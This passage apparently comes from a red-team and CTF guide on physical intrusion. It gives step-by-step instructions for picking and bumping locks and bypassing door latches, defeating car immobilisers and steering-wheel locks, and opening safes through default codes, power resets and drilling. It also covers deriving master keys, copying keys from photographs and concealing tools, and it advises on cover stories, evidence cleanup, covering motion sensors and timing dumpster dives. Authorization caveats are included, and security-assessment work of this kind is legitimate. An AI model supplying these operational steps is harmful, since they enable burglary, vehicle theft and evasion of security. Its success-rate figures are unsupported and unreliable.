**Recommended starter kit:**

```bash
# Budget option: Southord PXS-14 (14-piece set)
# Contains: Various hooks, rakes, half-diamond, tension wrenches
# Price range: $25-40

# Professional option: Peterson Ghost Set
# Contains: Government Steel picks, pry bars, specialized hooks
# Price range: $90-150

# Practice locks:
- Clear acrylic practice locks (view pin movement)
- Progressive pin sets (Sparrows, Reload Kit)
- Standard residential locks (Kwikset, Schlage)
```

**Single-Pin Picking (SPP)**

Single-pin picking is the most reliable technique, manipulating each pin individually.

**Step-by-step SPP process:**

1. **Insert tension wrench**
    
    - Bottom of keyway (BOK) for better pick access
    - Apply light rotational tension (clockwise for standard locks)
    - Pressure level: Very light, roughly 2-3 on 1-10 scale
2. **Insert pick and locate pins**
    
    - Use short hook pick
    - Gently probe to count pins and identify binding order
    - Note: Pins bind in sequence due to manufacturing tolerances
3. **Identify binding pin**
    
    - Apply slight tension
    - Push each pin upward gently
    - Binding pin will resist more than others (feels "springy" vs "mushy")
4. **Lift binding pin**
    
    - Apply upward pressure on binding pin
    - Listen/feel for subtle click or give
    - Pin should reach shear line; plug rotates slightly
5. **Repeat for remaining pins**
    
    - Maintain consistent tension
    - Identify next binding pin
    - Continue until all pins set at shear line
6. **Rotate plug to open**
    
    - Increase tension smoothly
    - Plug should rotate fully

**Common SPP mistakes:**

- **Over-tensioning**: Pins bind too tightly, cannot lift
    - Fix: Reduce tension to minimal resistance
- **Under-tensioning**: Set pins fall back down
    - Fix: Maintain steady, light pressure
- **Oversetting pins**: Lifting key pin and driver pin together past shear line
    - Fix: Release tension briefly to reset, use lighter touch
- **Skipping pins**: Missing binding pin, forcing non-binding pins
    - Fix: Methodically check each pin's resistance before pushing

**Raking Technique**

Raking is faster but less reliable than SPP, using rapid motion to bounce pins randomly to shear line.

**Zipping method:**

```
1. Insert rake (Bogota or snake rake) fully to back of lock
2. Apply light tension with wrench
3. Rapidly withdraw pick while applying upward pressure
4. Repeat 5-10 times with varying pressure
5. If unsuccessful, release tension, reset, try again with different pressure/speed
```

**Scrubbing method:**

```
1. Insert rake partially into keyway
2. Apply moderate tension
3. Move pick in/out rapidly while applying upward pressure
4. Create vibration that bounces pins to shear line
5. Continue 3-5 seconds, test plug rotation
```

**Rocking method:**

```
1. Insert rake to rear pins
2. Apply light tension
3. Rock pick up and down while slowly withdrawing
4. Lift each set of peaks over pins
5. Repeat multiple passes
```

**[Inference] Raking effectiveness:**

- Works best on cheap locks (Kwikset, Master Lock)
- Success rate decreases with security pins (spool, serrated)
- Useful for initial attempt before switching to SPP

**Security Pin Bypass**

Higher-security locks use security pins to resist picking.

**Spool pins:**

- Thin section in middle creates false set
- **Counter-picking**: Counter-rotation occurs when spool catches
- **Bypass technique**:
    
    ```
    1. Identify spool by counter-rotation when lifting pin2. Reduce tension when counter-rotation occurs3. Continue lifting pin gently until true set achieved4. Listen for multiple clicks (false set, then true set)
    ```
    

**Serrated pins:**

- Multiple thin sections create multiple false sets
- **Bypass technique**:
    
    ```
    1. Apply light tension2. Slowly lift pin through each serration3. Feel for multiple subtle clicks4. Continue past false sets to true shear line
    ```
    

**Mushroom pins:**

- Rounded top catches on shear line
- **Bypass technique**:
    
    ```
    1. Apply very light tension2. Lift pin slowly3. Adjust tension when mushroom catches4. Use rocking motion to slide past mushroom top
    ```
    

**Wafer Lock Picking**

Wafer locks use flat wafers instead of pins, common in filing cabinets, desks, and older vehicles.

**Wafer lock characteristics:**

- Wafers protrude into both plug and housing until correct key inserted
- Simpler design, generally easier to pick than pin tumbler locks

**Picking technique:**

```
1. Insert tension wrench (light tension)
2. Use ball pick or half-diamond
3. Gently lift/press each wafer until flush with shear line
4. Wafers spring-loaded; need to maintain position
5. Rotate plug when all wafers aligned
```

**Alternative: Jiggler keys**

```bash
# Jiggler keys are pre-cut patterns matching common wafer lock configurations
# Insert jiggler key, apply slight tension, jiggle up/down
# Effective on filing cabinets, older car locks, desk locks

# Can create custom jigglers by filing down blanks to common depths
```

**Tubular Lock Picking**

Tubular locks (circular keyway with pins arranged in circle) used on vending machines, bike locks, some laptops.

**Tubular lock pick tool:**

```
1. Measure lock diameter (7-pin standard: 7.5mm, 8-pin: 8mm)
2. Select corresponding tubular pick
3. Insert pick fully into lock
4. Apply moderate rotational tension
5. Slowly withdraw pick while maintaining tension
6. Tool automatically pushes pins to shear line
7. Lock should open when pick fully withdrawn
```

**Alternative: Pen tube method** [Unverified]

The "BIC pen bypass" technique allegedly worked on some Kryptonite bike locks (pre-2004). [Inference] This method is likely ineffective on modern tubular locks with improved tolerances.

**Bypass Techniques**

**Under-the-door tool (J-tool):**

```
For doors with panic bar handles:
1. Slide flat J-tool under door gap (requires >1/4 inch clearance)
2. Hook around panic bar from inside
3. Pull down to retract latch
4. Door opens
```

**DIY construction:**

```bash
# Materials: Coat hanger wire, measuring tape, pliers
# Bend coat hanger into J-shape with 90-degree hook
# Hook should be 3-4 inches long
# Total length: 24-36 inches depending on door width
```

**Latch slipping (shimming):**

```
Spring latch vulnerabilities:
1. Cut shim from soda can or credit card
2. Insert between door and frame at latch position
3. Slide shim against angled latch face
4. Push while applying pressure to door
5. Latch retracts, door opens
```

**Limitations:**

- Ineffective on deadbolts
- Anti-shim latches have guards preventing insertion
- Requires sufficient gap between door and frame

**Shim-resistant latch indicators:**

- Deadlocking latch (plunger beside main latch)
- Interlocking deadbolt engaged
- Minimal door/frame gap

**Deadbolt bypass via door gap:**

**Traveler's hook technique:**

```
For doors with exposed deadbolt latch:
1. Use thin, rigid wire or specialized tool
2. Insert between door and frame above/below deadbolt
3. Hook around deadbolt latch
4. Pull to retract deadbolt (only works on specific deadbolt types)
```

[Inference] Modern deadbolts with anti-bypass features resist this technique. Success depends on installation quality and deadbolt design.

**Key Bumping**

Key bumping uses a specially cut key to momentarily align all pins at shear line through kinetic energy transfer.

**Bump key creation:**

```bash
# Using key cutting machine or files:
1. Obtain blank key matching lock brand
2. Cut all positions to maximum depth (typically 9 or deepest cut)
3. File shoulder back 1-2mm for deeper insertion
4. Round tips slightly for smoother pin contact

# Alternative: Purchase pre-made bump keys
# Available for common brands: Kwikset, Schlage, Weiser
```

**Bumping technique:**

```
1. Insert bump key one pin position short of full insertion
2. Apply light rotational tension with tension wrench or finger pressure
3. Strike back of key sharply with rubber mallet or screwdriver handle
4. Kinetic energy transfers through key to all pins simultaneously
5. Driver pins jump above shear line momentarily
6. Tension rotates plug during this brief moment
7. Repeat if unsuccessful (2-10 attempts typical)
```

**Bumping effectiveness:**

- High success rate on standard pin tumbler locks (60-90%)
- Less effective on security-pinned locks
- Requires proper key blank for lock brand
- May damage lock with excessive force

**Impressioning**

Impressioning creates a working key by reading pin positions from marks left on blank key.

**Process:**

```
1. Insert filed blank key into lock (file sides for smooth insertion)
2. Apply rotational tension and in/out pressure
3. Pins mark blank at contact points
4. Remove key, file down marks slightly
5. Re-insert, apply tension, check for new marks
6. Repeat filing at marked locations
7. Continue until key turns lock (typically 10-30 iterations)
```

**Tools needed:**

- Key blank matching lock
- File set (pippin files, warding files)
- Magnification (loupe or magnifying glass)
- Good lighting

[Inference] Impressioning requires practice and patience. Success rate improves significantly with experience reading subtle marks.

**Electronic Lock Bypass**

**Keypad lock vulnerabilities:**

```
Thermal imaging attack:
- Use FLIR/thermal camera after legitimate user enters code
- Recently pressed buttons show heat signatures
- Reduces code possibilities significantly

# Example: 4-digit code on 10-button keypad
# Without thermal: 10,000 possible combinations
# With thermal (identifies 4 buttons): 24 possible combinations (4!)
```

**Brute force tools:**

```bash
# Matryoshka attack (for specific vulnerable keypad models)
# Exploits processing delays

# Keypad exhaustion scripts (vendor-specific)
# Requires knowledge of specific model vulnerabilities
```

**RFID proximity lock bypass:**

Covered in detail in Badge Cloning section above.

**Practice and Skill Development**

**Progressive training methodology:**

```
Level 1: Clear acrylic locks (observe pin movement)
Level 2: 3-pin locks (master basic technique)
Level 3: 5-pin standard locks (develop feel)
Level 4: Security-pinned locks (spools, serrated)
Level 5: High-security locks (Medeco, Mul-T-Lock)
```

**Recommended practice locks:**

```bash
# Beginner:
- Sparrows Revolver (multiple difficulty cores)
- Master Lock #3 (easy rake/SPP)
- Brinks brass padlocks

# Intermediate:
- American Lock 1100 series (security pins)
- Abus 55/40 (tight tolerances)
- Schlage residential deadbolts

# Advanced:
- Medeco Biaxial (rotating pins)
- Mul-T-Lock Interactive (telescoping pins)
- ASSA Twin (sidebar mechanism)
```

**Legal and Ethical Considerations**

[Critical] Lock picking laws vary by jurisdiction:

- Many regions prohibit possession of lock picks without legitimate purpose
- Unauthorized entry is illegal regardless of method
- Only practice on locks you own or have explicit permission to pick
- During authorized physical security assessments, maintain proper documentation and authorization letters

**CTF and Red Team Context**

During authorized physical penetration tests:

```
Documentation requirements:
- Signed authorization from facility owner
- Scope defining permitted areas and techniques
- Time windows for testing
- Emergency contact procedures
- Incident response protocols

Operational security:
- Carry authorization documents during testing
- Coordinate with facility security to avoid law enforcement calls
- Use covert entry techniques only when explicitly authorized
- Document all attempted and successful bypasses
- Restore locks/facilities to original state
```

---

**Critical Related Topics:**

For comprehensive physical security assessment capabilities:

- **Physical Penetration Testing Methodology** - Systematic approach to facility assessment
- **Covert Entry Tools and Techniques** - Advanced bypass methods for high-security installations
- **CCTV and Alarm System Exploitation** - Bypassing electronic surveillance
- **Tailgating and Piggybacking Psychology** - Human-factor exploitation techniques

**Advanced Lock Bypass Techniques**

**Bump Key Variations and Improvements**

**Electric pick guns:**

Electric pick guns automate the kinetic energy transfer used in manual bumping.

```bash
# Commercial options:
- Multipick Kronos (electric pick gun)
- SouthOrd Electric Pick Gun (EPG)
- Klom Electric Pick Gun

Operation:
1. Select appropriate tip for lock type (standard, European profile)
2. Insert tip into keyway until contacting pins
3. Apply light tension with integrated tension mechanism
4. Activate trigger (vibrations transfer to pins)
5. Pins bounce to shear line; tension catches plug rotation
6. Duration: 2-5 seconds of vibration typically sufficient
```

**Manual snap guns:**

```
Mechanism: Spring-loaded striking mechanism
1. Insert pick tip to contact bottom pins
2. Pull trigger to release spring
3. Tip strikes pins upward rapidly
4. Requires synchronized tension application
5. May require multiple strikes

Advantages over electric:
- No batteries required
- Quieter operation
- More portable
```

**[Inference] Pick gun effectiveness:**

- Very effective on standard pin tumbler locks (70-90% success rate)
- Reduced effectiveness on security-pinned locks
- Can damage lock mechanisms with excessive use
- Detection risk: audible clicking sound during operation

**Decoding Techniques**

Decoding determines pin heights without creating a working key, useful for duplicating keys remotely or understanding lock configuration.

**Visual decoding:**

```
Scope method:
1. Use borescope or specialized lock scope
2. Insert through keyway
3. Visually inspect pin positions
4. Measure heights relative to shear line
5. Record depths (typically 0-9 scale)

Requires:
- Borescope with sufficient illumination
- Access to keyway
- Knowledge of manufacturer's depth specifications
```

**Mechanical decoding:**

```
Lishi tool method:
1. Insert Lishi 2-in-1 tool (combined pick and decoder)
2. Pick lock using integrated tension and pick
3. Read pin depths from calibrated marks on tool
4. Record depths for key cutting

Advantages:
- Simultaneous picking and decoding
- No permanent marks or changes to lock
- Available for many lock brands (Kwikset, Schlage, Weiser, etc.)
```

**Decoding via impressioning marks:**

Covered in basic impressioning section, but advanced practitioners can decode depths from impression marks using depth gauges:

```bash
# Tools needed:
- Key gauge (measures cut depths)
- Depth/spacing chart for lock brand
- Calipers for precise measurement

Process:
1. Create impression marks on blank
2. Measure depth of each impression
3. Convert measurements to manufacturer's depth codes
4. Cut new key to specifications without further impressioning
```

**Sidebar Lock Exploitation**

Sidebar locks (Medeco, ASSA, Mul-T-Lock) use additional locking mechanisms beyond standard pins.

**Medeco biaxial locks:**

```
Characteristics:
- Pins must lift to correct height AND rotate to correct angle
- Sidebar engages with pin gates when properly rotated
- Highly pick-resistant

Attack methods:

1. Specialized Medeco picks:
   - Use picks with angled tips to rotate pins while lifting
   - Requires feeling for both shear line and rotation gates
   
2. Decoding attack:
   - Use Lishi Medeco tool (if available)
   - Decode pin rotations and heights simultaneously
   
3. Bypass via sidebar manipulation:
   - Some Medeco variants vulnerable to direct sidebar manipulation
   - Requires specialized tools and extensive practice
```

[Unverified] Some sources claim wire manipulation can directly retract Medeco sidebars, but this technique's reliability varies significantly by lock generation and installation.

**ASSA Twin sidebar:**

```
Characteristics:
- Two sidebars (one on each side)
- Pins must align height and angle for both sidebars
- Multiple pin types (master, regular, security)

Attack approach:
1. Extremely difficult to pick through SPP
2. Focus on key control bypass (impressioning, decoding)
3. Or exploit installation vulnerabilities (exposed set screws, removable cores)
```

**Mul-T-Lock telescoping pins:**

```
Characteristics:
- Outer and inner pin elements telescope
- Both elements must align independently at shear line
- Creates effectively 10+ pin positions in 5-pin lock

Attack considerations:
- Traditional picking largely ineffective
- Requires specialized knowledge of telescoping pin behavior
- Focus on obtaining legitimate key for decoding/duplication
- Or exploit via bump keys (some variants vulnerable)
```

**Disc Detainer Lock Picking**

Disc detainer locks (Abloy, Kaba) use rotating discs instead of pins.

**Abloy Classic attack:**

```bash
# Tools required:
- Abloy disc detainer pick (specialized tool)
- Strong tension wrench

Process:
1. Insert tension tool into sidebar track
2. Apply moderate rotational tension
3. Insert pick to contact discs
4. Feel for binding disc (resists rotation more than others)
5. Rotate binding disc until gate aligns with sidebar
6. Sidebar advances into disc gate
7. Repeat for remaining discs
8. Complete sidebar travel allows plug rotation

Difficulty: Very high
Success rate without extensive practice: <10%
```

**Abloy Protec/Protec2:**

[Inference] Protec variants include additional security features (angled cuts, false gates) making picking exponentially more difficult. No reliable picking technique exists publicly for Protec2.

**Kaba Peaks disc detainer:**

```
Attack approach:
- Similar principle to Abloy picking
- Different disc gate geometry
- Requires Kaba-specific picking tool

Alternative: Decoding via impressioning
- Insert filed blank key
- Apply tension and feel for disc positions
- Mark key at contact points
- File key to create gates for disc detainer
- More reliable than direct picking for experienced practitioners
```

**Dimple Lock Picking**

Dimple locks have pins arranged radially around the keyway rather than along top/bottom.

**Picking approach:**

```
Tools required:
- Dimple lock pick set (flags with various offsets)
- Thin tension wrench

Technique:
1. Insert tension wrench (typically TOK for dimple locks)
2. Apply light rotational tension
3. Insert flag pick
4. Feel for binding pin in any radial position
5. Lift binding pin (may be top, bottom, left, or right)
6. Continue around all pin positions
7. Maintain 3D awareness of which pins are set

Challenges:
- Pins in multiple dimensions simultaneously
- Difficult to track which pins already set
- Requires different feedback interpretation than standard picking
```

**Common dimple lock brands:**

- Kaba (Swiss round key)
- DOM (German dimple keys)
- EVVA (Austrian high-security)
- Chinese dimple padlocks (lower security, good practice)

**Automotive Lock Exploitation**

Vehicle locks present unique challenges and opportunities.

**Wafer lock vehicles (older vehicles):**

```
Attack methods:

1. Jiggler keys:
   - Insert automotive jiggler
   - Apply slight tension
   - Jiggle up/down rapidly
   - Effective on pre-2000 vehicles

2. Automotive pick sets:
   - Use double-sided picks for wafer locks
   - Pick both sides of wafer stack simultaneously
   - Common in locksmith kits
```

**Transponder/immobilizer systems:**

```bash
# Modern vehicles (post-2000) include electronic immobilizers
# Physical lock bypass alone insufficient for starting

Bypass approaches:

1. Key cloning (requires original key):
   - Use Proxmark3, Flipper Zero, or automotive key programmer
   - Clone RFID transponder from original key to blank
   - Cut physical key to match
   
2. Immobilizer bypass modules:
   - Some aftermarket modules bridge immobilizer circuit
   - Requires physical installation in vehicle
   - Varies by make/model

3. OBD-II exploitation:
   - Some vehicles vulnerable to key programming via OBD-II port
   - Requires vendor-specific tools/software
   - May require seed/key algorithms
```

**Steering wheel lock bypass:**

```bash
# "The Club" and similar devices

Method 1 - Sawing attack:
- Cut through steering wheel (softer than lock)
- Remove device through cut section
- Time: 30-60 seconds with hacksaw

Method 2 - Freeze and shatter:
- Apply compressed air freeze spray to lock cylinder
- Strike with hammer
- Lock cylinder shatters (some models)
- [Unverified] Effectiveness varies significantly by model

Method 3 - Shimming:
- Insert shim between locking arm and body
- Disengage locking mechanism
- Requires understanding of specific device mechanism
```

**Safe Manipulation and Bypass**

**Mechanical dial safe manipulation:**

```
Group 2 safe locks (common commercial safes):

Direct manipulation approach:
1. Dial to zero
2. Apply gentle opening pressure on handle
3. Slowly rotate dial, feeling for contact points
4. Note positions where increased resistance occurs (wheels contacting fence)
5. Graph contact points to determine gate positions
6. Calculate combination from gate positions

Time requirement: 1-4 hours for experienced operator
Success rate: 70-90% on Group 2 locks
```

**Electronic safe bypass:**

```bash
# Solenoid safe locks (common in hotel safes)

Default code exploitation:
- Many hotel/small safes retain default master codes
- Common defaults: 000000, 999999, 123456, 654321
- Try default code before other attacks

Override key exploitation:
- Most electronic safes include mechanical override keyhole
- Override keys often universal within brand
- Acquire override key for safe brand
- Tubular lock picks work on many override mechanisms

Battery/power manipulation:
- Some safes reset to default when power depleted
- Remove batteries (if externally accessible)
- Wait 10-30 minutes
- Restore power and try default codes
```

**Destructive entry techniques:**

[Inference] These methods are louder and leave evidence but may be faster than covert manipulation.

```
Drilling attack:
1. Identify drill point (varies by model, typically near dial or above)
2. Drill through body to access locking mechanism
3. Use borescope to view internals
4. Manipulate bolt mechanism directly with wire

Prying attack (weak safes):
1. Insert pry bar at door seam
2. Apply leverage to deform door or body
3. Disengage locking bolts
4. Effective only on low-security safes

Cutting attack:
- Angle grinder through body (very loud, sparks)
- Time: 5-30 minutes depending on steel thickness
- Last resort for physical penetration tests
```

**Master Key System Exploitation**

**Master key system hierarchy:**

```
Typical system:
- Change keys: Open specific individual locks
- Master keys: Open multiple locks in group
- Grand master keys: Open multiple groups
- Great grand master keys: Open entire facility

Vulnerability: Key bitting progressions
```

**Master wafer exploitation:**

```
Master keying implementation:
- Additional wafers/pins at certain positions
- Allow multiple key cuts to work
- Creates additional shear lines

Attack approach:
1. Obtain change key for any lock in system
2. Decode change key depths
3. Identify master wafer positions (vary from standard depths)
4. Calculate possible master key depths
5. Create candidate master keys
6. Test candidates
```

**Key control bypass:**

```bash
# If you can photograph a key:

1. Photographic decoding:
   - Photograph key with ruler for scale
   - Use key decoding software/charts
   - Calculate depths from image
   - Cut duplicate key

Tools:
- KeyDecoder (smartphone app for some lock types)
- Photo Key (online service for key duplication from photo)
- Manual calculation using depth/spacing charts

2. 3D printing keys:
   - Model key from photographs (multiple angles required)
   - Print in durable plastic (PLA, ABS)
   - Works on many standard locks
   - May require multiple print iterations for proper tolerances
```

**Key impressioning from photograph:**

```
Requirements:
- Clear photo of key blade (both sides for dimple keys)
- Known key blank type
- Manufacturer depth/spacing specifications

Process:
1. Import photo to CAD software
2. Scale to actual size using reference measurement
3. Measure cut depths from photo
4. Convert to manufacturer depth codes
5. Cut key to specifications

Limitation: Requires clear, well-lit photo at correct angle
```

**Covert Entry Tool Concealment**

**Everyday carry (EDC) concealment:**

```
Credit card lock pick sets:
- Flat picks and tension wrenches sized to fit in wallet
- Less effective than full picks but adequate for basic locks
- Examples: Dangerfield credit card set, SouthOrd credit card set

Belt buckle concealment:
- Hollow belt buckles can store picks
- TSA-compliant designs available
- Limited capacity (2-4 picks)

Pen concealment:
- Hollowed pens containing picks
- Or pens with integrated picks
- Writing functionality maintained

Keychain picks:
- Disguised as key blanks
- Or integrated into multi-tools
- Readily accessible
```

**Specialized covert entry kits:**

```bash
# Tool-tie (tie that contains picks)
# Wallet/passport concealment
# Watch with integrated picks
# "Sporting goods" concealment (fishing lure boxes, etc.)
```

[Critical] **Legal reminder:** Many jurisdictions consider concealed lock picking tools as burglary tools, creating legal liability even with legitimate intent. Always verify local laws.

**Physical Security Assessment Methodology**

**Pre-assessment checklist:**

```
1. Authorization documentation:
   [ ] Signed authorization letter from building owner/facility manager
   [ ] Scope document defining permitted areas
   [ ] Time windows for testing
   [ ] Emergency contact list
   [ ] Incident response procedures

2. Reconnaissance completion:
   [ ] Facility layout documented
   [ ] Access control systems identified
   [ ] Guard schedules observed
   [ ] Badge system researched
   [ ] Lock types documented

3. Tool preparation:
   [ ] Lock picks appropriate for identified locks
   [ ] Badge cloning equipment (if authorized)
   [ ] Documentation tools (camera, notepad)
   [ ] Emergency contact information accessible
   [ ] Backup tools in case of confiscation
```

**Assessment execution phases:**

```
Phase 1 - Perimeter testing:
- Fence integrity check
- Gate security assessment
- Vehicle barrier testing
- Exterior door/window security
- External lock assessment

Phase 2 - Entry point exploitation:
- Social engineering pretexts
- Badge cloning/duplication
- Lock picking on primary entries
- Tailgating opportunities
- Delivery/vendor access points

Phase 3 - Internal navigation:
- Bypassing internal access controls
- Restricted area penetration
- Server room/telecom closet access
- Executive office access
- Data center penetration

Phase 4 - Objective achievement:
- Reach target location (CEO office, server room, etc.)
- Photograph evidence of access
- Leave calling card (if authorized)
- Exfiltrate test data (if authorized)

Phase 5 - Documentation and debrief:
- Photograph all bypassed controls
- Document successful techniques
- Note security personnel responses
- Compile findings report
- Conduct debrief with client
```

**Post-assessment reporting:**

```
Executive summary:
- Overall security posture assessment
- Critical findings requiring immediate attention
- Risk ratings for identified vulnerabilities

Technical findings:
- Specific vulnerabilities exploited
- Tools and techniques used
- Time required for each bypass
- Detection events (if any)

Recommendations:
- Immediate remediation actions
- Medium-term improvements
- Long-term security program enhancements
- Training recommendations for security personnel

Evidence:
- Photographs of access achieved
- Video documentation (if authorized)
- Timestamps of entry/exit
- Copies of cloned badges (returned to client)
```

**Operational Security During Physical Assessments**

**Minimizing detection risk:**

```
Timing considerations:
- High-traffic periods provide better concealment
- But also more witnesses to technical work
- Balance: Enter during busy times, perform technical work during low-traffic

Appearance management:
- Dress appropriate to pretext and facility culture
- Confidence and purpose-driven behavior
- Avoid nervous behaviors (looking around excessively, hesitation)

Tool usage discretion:
- Practice lock picking to minimize time at lock
- Have cover story ready if interrupted ("Lost my key, trying to get in")
- Conceal tools until needed
- Clean up evidence (dropped picks, marks on locks)

Communication protocols:
- Establish check-in times with assessment team
- Safe words for emergency situations
- Backup exfiltration plans if detained
```

**If detained by security or law enforcement:**

```
1. Remain calm and professional
2. Immediately identify yourself as conducting authorized security assessment
3. Provide authorization documentation
4. Request facility security contact assessment sponsor
5. Do NOT resist or attempt to flee
6. Document incident thoroughly post-release
7. Notify client immediately of detection
```

**Counter-Measures and Detection**

**Understanding defensive measures encountered:**

```
Physical barriers:
- Mantraps (double-door airlocks)
- Turnstiles with anti-tailgating sensors
- Security glass resistant to forcible entry
- Reinforced door frames preventing bypass

Electronic monitoring:
- Motion sensors in restricted areas
- Door position switches (detect prop-open)
- Video analytics detecting loitering
- Badge usage monitoring (unusual patterns flagged)

Personnel controls:
- Security awareness training (challenge strangers)
- Photo verification at checkpoints
- Sign-in/escort requirements
- Two-person rule for sensitive areas

Lock hardening:
- Security pins in all locks
- Drill-resistant lock cylinders
- Bump-resistant mechanisms
- Pick-resistant keyways (restricted profiles)
```

**Bypassing enhanced security:**

```bash
# Mantraps:
- Social engineering: Follow legitimate user, engage in conversation
- Badge cloning: Use cloned badge synchronized with legitimate user
- Door mechanism exploitation: Some mantraps vulnerable if inner/outer doors forced simultaneously

# Video analytics:
- Pattern recognition evasion: Mimic normal user behavior patterns
- Blind spot exploitation: Previously documented camera blind spots
- Timing attacks: Access during camera maintenance windows (if discovered during recon)

# Two-person rule:
- Pretext coordination: Two team members with complementary pretexts
- Split-team approach: One distracts/engages while other accesses
- Piggyback on legitimate two-person access
```

**Lock Picking Practice and Skill Progression**

**Structured practice regimen:**

```
Week 1-2: Basic tension and feedback
- Clear acrylic locks (observe pin movement)
- Focus on tension control
- Identify binding pins visually
- Goal: Consistent opens on 3-pin locks

Week 3-4: Standard pin tumbler mastery
- 5-pin brass locks (Master Lock, Brinks)
- Develop tactile feedback (no visual aid)
- Practice both SPP and raking
- Goal: <2 minute opens on standard 5-pin locks

Week 5-6: Security pins introduction
- American 1100 series (spool pins)
- Focus on recognizing counter-rotation
- Learn tension adjustment techniques
- Goal: Reliable opens on spool-pinned locks

Week 7-8: Advanced techniques
- Serrated pins, mushroom pins
- Multiple security pin types in same lock
- Begin impressioning practice
- Goal: Consistent opens on multi-security-pin locks

Week 9-10: Specialized locks
- Dimple locks, disc detainers
- Tubular locks
- Automotive locks
- Goal: Familiarity with alternative locking mechanisms

Week 11-12: Speed and efficiency
- Timed picking challenges
- Blindfolded picking (pure tactile feedback)
- Covert entry simulations (awkward positions, time pressure)
- Goal: <60 second opens on previously mastered locks
```

**Feedback development exercises:**

```
1. Pin counting drill:
   - Pick lock with eyes closed
   - Count number of pins by feel alone
   - Verify by opening eyes
   - Develop spatial awareness

2. Binding order mapping:
   - Document binding order for specific lock
   - Pick same lock multiple times
   - Confirm binding order remains consistent
   - Understand manufacturing tolerance effects

3. False set recognition:
   - Practice on security-pinned locks
   - Document feeling of false set vs. true set
   - Learn to differentiate subtle feedback differences

4. Overset recovery:
   - Intentionally overset pins
   - Practice releasing tension to reset
   - Develop controlled reset techniques
```

**Advanced Physical Security Tools**

**Specialized extraction and entry tools:**

```
Beyond basic lock picks:

- Crash bars: Heavy pry bars for forced entry
- Hydraulic spreaders: Separate door from frame
- Ramsets: Explosive-powered nail guns for creating access
- Glass cutters: Silent glass penetration
- Thermal lances: Cut through metal (very loud, dangerous)
- Halligan tools: Firefighter pry bars, effective on doors
```

[Critical] These destructive tools should only be used in authorized testing scenarios with explicit permission for destructive entry testing.

**Electronic access control bypass tools:**

```bash
# HID card readers - tools beyond Proxmark3:

- Riptide device: Emulates badges, portable format
- Chameleon Mini: Open-source RFID emulator
- NFCopy: Smartphone-based NFC cloning (limited capability)

# Keypad bypass devices:

- Brute force black boxes (vendor-specific)
- Oscilloscope to read electromagnetic emissions during code entry
- UV light to detect frequently pressed buttons (wear patterns)
```

**Improvised tools:**

```
Field-expedient picks:
- Bobby pins (tension wrench and pick)
- Paper clips (light locks only)
- Windshield wiper inserts (tensioner)
- Street sweeper bristles (stiff picks)

Shims:
- Aluminum soda cans
- Credit cards/gift cards
- Thin plastic packaging material
- Feeler gauges

Bypass tools:
- Coat hangers (under-door tool)
- Ruler/metal strip (latch slipping)
- Duct tape (defeating motion sensors via covering)
```

**Documentation and Evidence Management**

**Photographic evidence standards:**

```
Required photographs:
1. Exterior facility shot (establishes location)
2. Access point before bypass attempt
3. Close-up of lock/access control device
4. Tool in use (demonstrates technique)
5. Successful entry (open door, inside restricted area)
6. Target objective reached (server room, CEO office, etc.)
7. Evidence of access (calling card, test data)
8. Restoration (area returned to original state)

Metadata requirements:
- Timestamp (GPS time, not reliant on camera clock)
- Geolocation (if safe to include)
- Operator ID (which team member)
- Attempt number (if multiple attempts required)
```

**Chain of custody for physical evidence:**

```
Collected items (must be documented):
- Cloned badges (return to client after assessment)
- Impressioned keys (destroy or return)
- Documents removed from facility (return or destroy)
- Photographic/video evidence (secure storage)

Documentation requirements:
- Item description and collection location
- Date/time of collection
- Collecting operator
- Custodial chain (who handled evidence)
- Final disposition (returned, destroyed, retained)
```

**Ethical Considerations in Physical Security Testing**

**Boundaries and limitations:**

```
Always prohibited (even with authorization):
- Physical harm to persons
- Damage to critical infrastructure
- Theft of actual valuables or data
- Creating safety hazards (propping fire doors, etc.)
- Compromising life-safety systems

Requires explicit written authorization:
- Destructive entry techniques
- Access to executive offices
- Server room/data center access
- After-hours testing
- Testing that may trigger law enforcement response

Professional standards:
- Minimize disruption to business operations
- Restore security controls to original state
- Immediately report safety hazards discovered
- Protect collected information appropriately
- Debrief security staff professionally
```

---

**Critical Integration Topics:**

The physical security assessment connects with other CTF and red team domains:

- **Network Tap Installation** - Once physical access achieved, deploy covert network monitoring
- **Wireless Attack Positioning** - Use physical access to place attacking devices closer to targets
- **Data Exfiltration via Physical Access** - Directly accessing systems bypasses network security controls
- **Social Engineering Attack Vectors** - Combine physical and digital social engineering for comprehensive testing

---

### Dumpster Diving Targets

Dumpster diving is the practice of searching through an organization's trash to find sensitive information that has been improperly disposed of. This technique exploits the gap between digital security awareness and physical document handling procedures.

**High-Value Targets in Dumpster Diving:**

**1. Paper Documents:**

- **Internal memos and emails** - May contain passwords, system information, or organizational structure
- **Printed passwords and credentials** - Sticky notes, temporary password sheets, password reset emails
- **Network diagrams and topology maps** - Infrastructure layouts, IP addressing schemes, VLAN configurations
- **Source code printouts** - Application logic, API endpoints, hardcoded credentials
- **Financial documents** - Invoices revealing vendor relationships, banking information
- **Employee directories** - Names, job titles, phone extensions, email formats
- **Shipping labels and packaging** - Vendor relationships, equipment purchases, delivery schedules
- **Calendar printouts** - Meeting schedules, project timelines, employee availability patterns
- **Technical documentation** - System manuals, configuration guides, troubleshooting notes
- **Discarded ID badges or access cards** - Physical access credentials, employee photos

**2. Electronic Media:**

- **Hard drives and SSDs** - Even "wiped" drives may contain recoverable data
- **USB flash drives** - Often discarded when appearing faulty but data may be intact
- **CDs/DVDs/Backup tapes** - Software installation media, backup archives, corporate presentations
- **Smartphones and tablets** - Corporate devices with potential MDM misconfigurations
- **Printers and multifunction devices** - Internal storage may contain cached documents
- **Networking equipment** - Routers, switches with configuration files in NVRAM

**3. Metadata-Rich Items:**

- **Business cards** - Contact information, email formats, organizational hierarchy
- **Letterhead and envelopes** - Organizational branding, office locations, department names
- **Vendor documentation** - Service agreements, technical support contacts, account numbers
- **Purchase orders** - Equipment specifications, software licenses, security products in use

**Reconnaissance Before Dumpster Diving:**

```bash
# Target identification and scheduling
# Optimal times: Late evening after office hours, early morning before pickup
# Days: Night before scheduled trash collection

# Information gathering
- Observe trash collection schedule (weekly patterns)
- Identify dumpster locations and access restrictions
- Note security camera coverage and guard patrol patterns
- Check for locks, compactors, or enclosed trash areas
- Identify recycling bins (often less secure than trash)
```

**Legal and Safety Considerations:**

[Unverified - varies by jurisdiction]: Dumpster diving legality is jurisdiction-dependent. In some regions, trash on public property or curbs is considered abandoned and legally accessible. However:

- **Private property** - Accessing dumpsters on private property without permission is typically trespassing
- **Gated/locked areas** - Bypassing physical security controls is generally illegal
